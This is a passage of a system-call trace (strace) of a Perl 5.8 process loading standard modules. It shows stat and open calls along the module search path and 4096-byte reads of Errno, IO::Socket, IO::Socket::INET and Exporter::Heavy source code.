ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
7464  07:18:53.283243 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
7464  07:18:53.283695 _llseek(8, 5966, [5966], SEEK_SET) = 0
7464  07:18:53.283711 _llseek(8, 0, [5966], SEEK_CUR) = 0
7464  07:18:53.283722 close(8)          = 0
7464  07:18:53.284167 brk(0x827b000)    = 0x827b000
7464  07:18:53.284292 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
7464  07:18:53.284787 _llseek(6, 6698, [6698], SEEK_SET) = 0
7464  07:18:53.284803 _llseek(6, 0, [6698], SEEK_CUR) = 0
7464  07:18:53.284846 close(6)          = 0
7464  07:18:53.284867 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284898 stat64("/etc/perl/IO/Socket/INET.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284913 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284926 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284940 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284953 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284967 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284979 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.284992 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.285004 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.285018 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.285031 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
7464  07:18:53.285056 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.285071 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.285082 _llseek(6, 0, [0], SEEK_CUR) = 0
7464  07:18:53.285099 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && $addr_str !~ /^\\d+(?:\\.\\d+){3}$/) {\n\t(undef, undef, undef, undef, @addr) = gethostbyname($addr_str);\n    } else {\n\tmy $h = inet_aton($addr_str);\n\tpush(@addr, $h) if defined $h;\n    }\n    @addr;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
7464  07:18:53.285467 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285483 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285496 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285509 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285524 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285536 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285551 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285563 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285576 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285588 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285602 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285614 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfa6ca2c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285628 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfa6cb1c) = -1 ENOENT (No such file or directory)
7464  07:18:53.285641 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
7464  07:18:53.285662 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
7464  07:18:53.285677 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c838) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.285688 _llseek(8, 0, [0], SEEK_CUR) = 0
7464  07:18:53.285705 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
7464  07:18:53.287224 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
7464  07:18:53.287425 brk(0x829c000)    = 0x829c000
7464  07:18:53.287844 read(8, "", 4096) = 0
7464  07:18:53.287860 close(8)          = 0
7464  07:18:53.288749 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
7464  07:18:53.296346 _llseek(6, 6496, [6496], SEEK_SET) = 0
7464  07:18:53.296362 _llseek(6, 0, [6496], SEEK_CUR) = 0
7464  07:18:53.296373 close(6)          = 0
7464  07:18:53.296492 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296510 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296524 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296538 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296552 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296565 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296579 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296591 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296605 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296617 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfa6cedc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296630 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfa6cfcc) = -1 ENOENT (No such file or directory)
7464  07:18:53.296643 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
7464  07:18:53.296665 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
7464  07:18:53.296680 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6cce8) = -1 ENOTTY (Inappropriate ioctl for device)
7464  07:18:53.296691 _llseek(6, 0, [0], SEEK_CUR) = 0
